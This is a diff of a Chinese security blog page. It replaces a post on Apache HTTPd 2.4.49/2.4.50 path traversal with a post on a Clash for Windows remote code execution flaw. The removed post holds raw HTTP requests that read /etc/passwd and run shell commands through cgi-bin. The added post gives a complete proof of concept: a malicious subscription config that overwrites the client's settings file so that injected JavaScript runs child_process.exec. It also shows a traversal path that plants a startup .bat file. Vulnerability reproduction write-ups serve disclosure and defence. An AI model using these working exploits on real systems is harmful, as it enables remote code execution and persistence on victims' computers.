@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="">
-  <title>Apache 2.4.49 | Love is a Moment Story</title>
+  <title>clash最新远程代码执行漏洞 | Love is a Moment Story</title>
   <meta name="author" content="zhang rui" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -13,20 +13,19 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <meta name="format-detection" content="telphone=no, email=no" />
   
-    <meta name="keywords" content="Apache 2.4.49" />
+    <meta name="keywords" content="" />
   
-  <meta name="description" content="漏洞描述 Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露了CVE-2021-42013 Apache HTTPd 2.4.49&#x2F;2.4.50 路径穿越漏洞。由于对CVE-2021-41773 Apache HTTPd 2.4.49 路径穿越漏洞的修复不完善，攻击者可构造恶意请求绕过补丁，利用穿越漏洞读取">
+  <meta name="description" content="漏洞概述 clash for windows是一个使用 Go 语言编写，基于规则的跨平台代理软件核心程序。 Clash for Windows 是运行在 Windows 上的一图形化 Clash 分支。通过 Clash API 来配置和控制 Clash 核心程序，便于用户可视化操作和使用。 下载链接： 1https:&#x2F;&#x2F;github.com&#x2F;Fndroid&#x2F;clash_for_windows_p">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Apache 2.4.49">
-<meta property="og:url" content="http://example.com/2021/10/15/Apache-2-4-49/index.html">
+<meta property="og:title" content="clash最新远程代码执行漏洞">
+<meta property="og:url" content="http://example.com/2023/01/18/clash%E6%9C%80%E6%96%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Love is a Moment Story">
-<meta property="og:description" content="漏洞描述 Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露了CVE-2021-42013 Apache HTTPd 2.4.49&#x2F;2.4.50 路径穿越漏洞。由于对CVE-2021-41773 Apache HTTPd 2.4.49 路径穿越漏洞的修复不完善，攻击者可构造恶意请求绕过补丁，利用穿越漏洞读取">
+<meta property="og:description" content="漏洞概述 clash for windows是一个使用 Go 语言编写，基于规则的跨平台代理软件核心程序。 Clash for Windows 是运行在 Windows 上的一图形化 Clash 分支。通过 Clash API 来配置和控制 Clash 核心程序，便于用户可视化操作和使用。 下载链接： 1https:&#x2F;&#x2F;github.com&#x2F;Fndroid&#x2F;clash_for_windows_p">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/null">
-<meta property="article:published_time" content="2021-10-15T02:09:10.000Z">
-<meta property="article:modified_time" content="2022-12-06T09:07:32.218Z">
+<meta property="article:published_time" content="2023-01-18T03:19:36.000Z">
+<meta property="article:modified_time" content="2023-01-18T03:22:46.690Z">
 <meta property="article:author" content="zhang rui">
-<meta property="article:tag" content="Apache 2.4.49">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/null">
 <meta name="twitter:site" content="@null">
@@ -172,17 +171,17 @@
     <div class="kratos-hentry kratos-post-inner clearfix">
         <header class="kratos-entry-header">
             
-                <h1 class="kratos-entry-title text-center">Apache 2.4.49</h1>
+                <h1 class="kratos-entry-title text-center">clash最新远程代码执行漏洞</h1>
             
             
             <ul class="kratos-post-meta text-center">
-                <li><i class="fa fa-calendar"></i> 2021-10-15</li>
+                <li><i class="fa fa-calendar"></i> 2023-01-18</li>
                 <li><i class="fa fa-user"></i> 作者 zhang rui</li>
                 <li>
                     <i class="fa fa-edit"></i> 
                     
                     
-                        1072
+                        ~2.26K
                     
                     字
                 </li>
@@ -191,42 +190,55 @@
         </header>
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1670317652218"></time> 前，其中的内容可能需要更新。
+                本文最后编辑于 <time datetime="1674012166690"></time> 前，其中的内容可能需要更新。
             </div>
             
                 <div class="kratos-post-inner-toc">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-2-4-49-CVE-2021-41773"><span class="toc-number">1.</span> <span class="toc-text">Apache 2.4.49 (CVE-2021-41773)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-2-4-50-CVE-2021-42013"><span class="toc-number">2.</span> <span class="toc-text">Apache 2.4.50 (CVE-2021-42013)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">批量多线程检测工具：</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#PoC"><span class="toc-number">1.</span> <span class="toc-text">PoC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">日志文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%A1%A5%E5%85%85"><span class="toc-number">3.</span> <span class="toc-text">其他补充</span></a></li></ol>
                 </div>
             
             <hr />
-            <p><strong>漏洞描述</strong></p>
-<p>Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露了CVE-2021-42013 Apache HTTPd 2.4.49/2.4.50 路径穿越漏洞。由于对CVE-2021-41773 Apache HTTPd 2.4.49 路径穿越漏洞的修复不完善，攻击者可构造恶意请求绕过补丁，利用穿越漏洞读取到Web目录之外的其他文件。同时若Apache HTTPd开启了cgi支持，攻击者可构造恶意请求执行命令，控制服务器。</p>
-<p><strong>影响版本</strong></p>
-<p>Apache HTTPd 2.4.49/2.4.50版本</p>
-<p><strong>验证过程</strong></p>
-<p>Apache HTTPd 2.4.49 任意文件读取漏洞验证：</p>
-<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20211015101123969.png" alt="image-20211015101123969"></p>
-<p>GET数据包：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
+            <p><img src="https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic" alt="图片"></p>
+<p><strong>漏洞概述</strong></p>
+<p>clash for windows是一个使用 Go 语言编写，基于规则的跨平台代理软件核心程序。 Clash for Windows 是运行在 Windows 上的一图形化 Clash 分支。通过 Clash API 来配置和控制 Clash 核心程序，便于用户可视化操作和使用。</p>
+<p><strong>下载链接：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Fndroid/clash_for_windows_pkg/releases</span><br></pre></td></tr></table></figure>
 
-<p>Apache HTTPd 2.4.49 命令执行测试，未能成功回显命令，回显了bash报错信息。</p>
-<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20211015101211618.png" alt="image-20211015101211618"></p>
-<p>POST数据包：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 13</span><br><span class="line"> </span><br><span class="line">echo;ifconfig</span><br></pre></td></tr></table></figure>
+<p>目前最新版本为V 0.20.12。</p>
+<p>Windows 上的 clash_for_windows 在 0.20.12 在订阅一个恶意链接时存在远程命令执行漏洞。因为对订阅文件中 rule-providers 的 path 的不安全处理导致 cfw-setting.yaml 会被覆盖，cfw-setting.yaml 中 parsers 的 js代码将会被执行。</p>
+<p><strong>影响版本版本：</strong>&lt; V 0.20.12V</p>
+<p><strong>操作系统：</strong>Windows x64</p>
+<p><strong>系统版本：</strong>Windows 11</p>
+<p><strong>风险等级：</strong>高危</p>
+<p><strong>漏洞复现</strong></p>
+<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><ol>
+<li><p>The attacker starts a web service to ensure that these two files can be accessed:</p>
+<p>启动一个web服务来确保这两个文件可以被访问</p>
+</li>
+</ol>
+<p>config.yaml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">port: 7890</span><br><span class="line">socks-port: 7891</span><br><span class="line">allow-lan: true</span><br><span class="line">mode: Rule</span><br><span class="line">log-level: info</span><br><span class="line">external-controller: :9090</span><br><span class="line">proxies:</span><br><span class="line">  - name: a</span><br><span class="line">    type: socks5</span><br><span class="line">    server: 127.0.0.1</span><br><span class="line">    port: &quot;17938&quot;</span><br><span class="line">    skip-cert-verify: true</span><br><span class="line"></span><br><span class="line">rule-providers:</span><br><span class="line">  p:</span><br><span class="line">    type: http</span><br><span class="line">    behavior: domain</span><br><span class="line">    url: &quot;http://this.your.url/cfw-settings.yaml&quot;</span><br><span class="line">    path: ./cfw-settings.yaml</span><br><span class="line">    interval: 86400</span><br></pre></td></tr></table></figure>
 
-<p>Apache HTTPd 2.4.50 命令执行测试：</p>
-<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20211015101238669.png" alt="image-20211015101238669"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 13</span><br><span class="line"> </span><br><span class="line">echo;ifconfig</span><br></pre></td></tr></table></figure>
+<p>cfw-settings.yaml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload:</span><br><span class="line">  - DOMAIN-SUFFIX,acl4.ssr,全球直连</span><br><span class="line">showNewVersionIcon: true</span><br><span class="line">hideAfterStartup: false</span><br><span class="line">randomControllerPort: true</span><br><span class="line">runTimeFormat: &quot;hh : mm : ss&quot;</span><br><span class="line">trayOrders:</span><br><span class="line">  - - icon</span><br><span class="line">  - - status</span><br><span class="line">    - traffic</span><br><span class="line">    - text</span><br><span class="line">hideTrayIcon: false</span><br><span class="line">connShowProcess: true</span><br><span class="line">showTrayProxyDelayIndicator: true</span><br><span class="line">profileParsersText: &gt;-</span><br><span class="line">  parsers:</span><br><span class="line">    - reg: .*</span><br><span class="line">      code: </span><br><span class="line">        module.exports.parse = async (raw, &#123; axios, yaml, notify, console &#125;, &#123; name, url, interval, selected &#125;) =&gt; &#123;</span><br><span class="line">          require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);</span><br><span class="line">          return raw;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
 
-<p>一个图片总结这次ApacheHTTPd 2.4.50版本修复不完善。</p>
-<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/image-20211015101302065.png" alt="image-20211015101302065"></p>
-<p><strong>修复建议</strong></p>
-<p>建议使用Apache HTTPd 2.4.49 与Apache HTTPd 2.4.50 版本的服务器更新Apache HTTPd 版本至最新。</p>
-<p><strong>检测工具</strong></p>
-<h2 id="Apache-2-4-49-CVE-2021-41773"><a href="#Apache-2-4-49-CVE-2021-41773" class="headerlink" title="Apache 2.4.49 (CVE-2021-41773)"></a>Apache 2.4.49 (CVE-2021-41773)</h2><h2 id="Apache-2-4-50-CVE-2021-42013"><a href="#Apache-2-4-50-CVE-2021-42013" class="headerlink" title="Apache 2.4.50 (CVE-2021-42013)"></a>Apache 2.4.50 (CVE-2021-42013)</h2><h2 id="批量多线程检测工具："><a href="#批量多线程检测工具：" class="headerlink" title="批量多线程检测工具："></a>批量多线程检测工具：</h2><p>Github地址：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013">https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013</a></p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/image-20211015101457783.png" alt="image-20211015101457783"></p>
-<p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/df0e622806a60f52f351f30127ad7944.png" alt="df0e622806a60f52f351f30127ad7944"></p>
+<ol>
+<li><p>Victim uses subscription link </p>
+<p>使用订阅链接</p>
+</li>
+<li><p>restart the clash_for_windows_pkg</p>
+<p>重新启动</p>
+</li>
+<li><p>Update subscriptions or import new subscriptions</p>
+<p>更新订阅或导入新订阅</p>
+</li>
+</ol>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1mtwZURvGTmXBvXrlIrNyUjyw3h1tDJjkp11P8pibSY3JJtc4ukWXhFKjr1fVFqqtTO6icZAzAUich5NqMb1TtcCw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><blockquote>
+<p>No response</p>
+</blockquote>
+<h3 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充"></a>其他补充</h3><p>由于是rule-providers的自定义path的问题，还有其他利用方式，比如用目录穿越写入开机启动项<br>path: ../../../../../../Users/User/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/hack.bat<br>不过杀毒软件会弹框</p>
+<p>Since it is a problem with the custom path of rule-providers, there are other ways to use it, such as using directory traversal to write into the startup item<br>path: ../../../../../../Users/User/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/hack.bat<br>But the antivirus software will warn.</p>
 
         </div>
         
@@ -280,7 +292,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "http://example.com/2021/10/15/Apache-2-4-49/",
+                text: "http://example.com/2023/01/18/clash%E6%9C%80%E6%96%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -292,10 +304,11 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "http://example.com/2021/10/15/Apache-2-4-49/";
-            const title         = "「Apache 2.4.49」";
-            const excerpt       = `漏洞描述
-Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露了CVE-2021-42013 Apache HTTPd 2.4.49/2.4.5...`;
+            const hostUrl       = "http://example.com/2023/01/18/clash%E6%9C%80%E6%96%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/";
+            const title         = "「clash最新远程代码执行漏洞」";
+            const excerpt       = `
+漏洞概述
+clash for windows是一个使用 Go 语言编写，基于规则的跨平台代理软件核心程序。 Clash for Windows 是运行在 Windows 上的一图形化 Clash 分支。通过 Clash API 来配...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -314,10 +327,10 @@ Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10�
             <div class="footer-tag clearfix">
                 <div class="pull-left">
                 <i class="fa fa-tags"></i>
-                    <a class="tag-none-link" href="/tags/Apache-2-4-49/" rel="tag">Apache 2.4.49</a>
+                    
                 </div>
                 <div class="pull-date">
-                <span>最后编辑：2022-12-06</span>
+                <span>最后编辑：2023-01-18</span>
                 </div>
             </div>
         </footer>
@@ -326,13 +339,9 @@ Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10�
         <nav class="navigation post-navigation clearfix" role="navigation">
             
             <div class="nav-previous clearfix">
-                <a title=" Spring Boot Actuator未授权访问利用实战利用" href="/2021/09/17/Spring Boot Actuator未授权访问利用实战利用/">&lt; 上一篇</a>
+                <a title=" 禅道系统权限绕过与命令执行漏洞（附POC）~" href="/2023/01/18/禅道系统权限绕过与命令执行漏洞（附POC）/">&lt; 上一篇</a>
             </div>
             
-            
-            <div class="nav-next clearfix">
-                <a title=" 工控安全CTF入门小记" href="/2021/11/18/工控安全CTF入门小记/">下一篇 &gt;</a>
-            </div>
             
         </nav>
     
@@ -341,8 +350,8 @@ Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10�
 
 <script>
     var disqus_config = function () {
-        this.page.url = 'http://example.com/2021/10/15/Apache-2-4-49/';  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = '2021/10/15/Apache-2-4-49/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = 'http://example.com/2023/01/18/clash%E6%9C%80%E6%96%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = '2023/01/18/clash最新远程代码执行漏洞/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
     var load_comm = () => {
         if (typeof DISQUS == 'undefined') {
@@ -354,8 +363,8 @@ Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10�
             DISQUS.reset({
                 reload: true,
                 config: function () {  
-                    this.page.url = 'http://example.com/2021/10/15/Apache-2-4-49/';  // Replace PAGE_URL with your page's canonical URL variable
-                    this.page.identifier = '2021/10/15/Apache-2-4-49/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                    this.page.url = 'http://example.com/2023/01/18/clash%E6%9C%80%E6%96%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/';  // Replace PAGE_URL with your page's canonical URL variable
+                    this.page.identifier = '2023/01/18/clash最新远程代码执行漏洞/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
                 }
             });
         }
@@ -403,7 +412,7 @@ Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10�
         <span class="toc-progress-bar"></span>
     </h4>
     <div class="textwidget">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-2-4-49-CVE-2021-41773"><span class="toc-text">Apache 2.4.49 (CVE-2021-41773)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-2-4-50-CVE-2021-42013"><span class="toc-text">Apache 2.4.50 (CVE-2021-42013)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="toc-text">批量多线程检测工具：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#PoC"><span class="toc-text">PoC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-text">日志文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%A1%A5%E5%85%85"><span class="toc-text">其他补充</span></a></li></ol>
     </div>
 </aside>
                 
